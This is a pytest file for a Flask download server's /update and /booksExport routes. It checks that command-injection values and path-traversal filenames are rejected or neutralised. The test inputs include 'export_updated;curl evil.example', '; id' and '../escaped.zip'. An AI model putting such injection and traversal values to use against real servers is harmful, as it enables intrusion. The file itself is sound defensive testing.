"""Route tests for DownloadServer.py.

The exporter and local_settings modules pull in Sefaria-Project and a database, so
they are stubbed. These tests exercise the route code that reads request values.
"""
import os
import sys
import types

import pytest

REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


@pytest.fixture()
def server(tmp_path, monkeypatch):
    export_root = tmp_path / 'export'
    (export_root / '7').mkdir(parents=True)

    local_settings = types.ModuleType('local_settings')
    local_settings.SEFARIA_EXPORT_PATH = str(export_root)
    local_settings.SEFARIA_IOS_SOURCES_PATH = str(tmp_path / 'ios')
    local_settings.SEFARIA_ANDROID_SOURCES_PATH = str(tmp_path / 'android')
    local_settings.ZIP_BUNDLE_PATH = str(tmp_path / 'zip')
    local_settings.MINIFY_JSON = False
    local_settings.USE_CLOUDFLARE = False
    local_settings.DEBUG_MODE = False
    monkeypatch.setitem(sys.modules, 'local_settings', local_settings)

    exporter = types.ModuleType('JsonExporterForIOS')
    exporter.SEFARIA_EXPORT_PATH = str(export_root)
    exporter.SCHEMA_VERSION = '7'
    exporter.PREV_SCHEMA_VERSION = '6'
    exporter.get_export_path = lambda version: f'{export_root}/{version}'
    exporter.build_split_archive = lambda *args, **kwargs: None
    exporter.updated_books_list = lambda: []
    exporter.new_books_since_last_update = lambda: []
    exporter.clear_old_bundles = lambda *args, **kwargs: None
    monkeypatch.setitem(sys.modules, 'JsonExporterForIOS', exporter)

    monkeypatch.syspath_prepend(REPO_ROOT)
    sys.modules.pop('DownloadServer', None)
    import DownloadServer
    DownloadServer.app.config['TESTING'] = True
    monkeypatch.setenv('PASSWORD', 'secret')
    return DownloadServer


@pytest.fixture()
def started_commands(server, monkeypatch):
    commands = []

    class FakeProcess:
        def wait(self):
            return 0

    def fake_popen(command, **kwargs):
        commands.append(command)
        return FakeProcess()

    monkeypatch.setattr(server.subprocess, 'Popen', fake_popen)
    return commands


def test_update_rejects_unknown_action(server, started_commands):
    client = server.app.test_client()
    response = client.get('/update', query_string={'password': 'secret', 'action': 'export_updated;curl evil.example'})
    assert response.status_code == 400
    assert started_commands == []


def test_update_keeps_index_as_one_argument(server, started_commands):
    client = server.app.test_client()
    response = client.get('/update', query_string={'password': 'secret', 'index': '; id'})
    assert response.status_code == 200
    assert len(started_commands) == 1
    command = started_commands[0]
    assert isinstance(command, list)
    assert command[1] == 'JsonExporterForIOS.py'
    assert command[2] == 'export_updated'
    assert command[3] == '; id'


def test_update_passes_book_title_as_one_argument(server, started_commands):
    client = server.app.test_client()
    response = client.get('/update', query_string={
        'password': 'secret', 'action': 'export_text', 'index': 'Genesis Rabbah',
    })
    assert response.status_code == 200
    assert started_commands[0][2:] == ['export_text', 'Genesis Rabbah']


def test_update_still_requires_password(server, started_commands):
    client = server.app.test_client()
    response = client.get('/update', query_string={'action': 'export_updated'})
    assert response.status_code == 403
    assert started_commands == []


@pytest.mark.parametrize('filename', ['../escaped.zip', '../../escaped.zip', '{absolute}', 'sub/escaped.zip'])
def test_books_export_rejects_path_outside_export_dir(server, tmp_path, filename):
    escaped = tmp_path / 'escaped.zip'
    filename = filename.format(absolute=escaped)
    client = server.app.test_client()
    response = client.post('/booksExport', query_string={'password': 'secret', 'filename': filename}, data=b'payload')
    assert response.status_code == 400
    assert not escaped.exists()


def test_books_export_rejects_missing_filename(server):
    client = server.app.test_client()
    response = client.post('/booksExport', query_string={'password': 'secret'}, data=b'payload')
    assert response.status_code == 400


def test_books_export_writes_into_export_dir(server, tmp_path):
    client = server.app.test_client()
    response = client.post('/booksExport', query_string={'password': 'secret', 'filename': 'Genesis.zip'}, data=b'payload')
    assert response.status_code == 200
    saved = tmp_path / 'export' / '7' / 'Genesis.zip'
    assert saved.read_bytes() == b'payload'
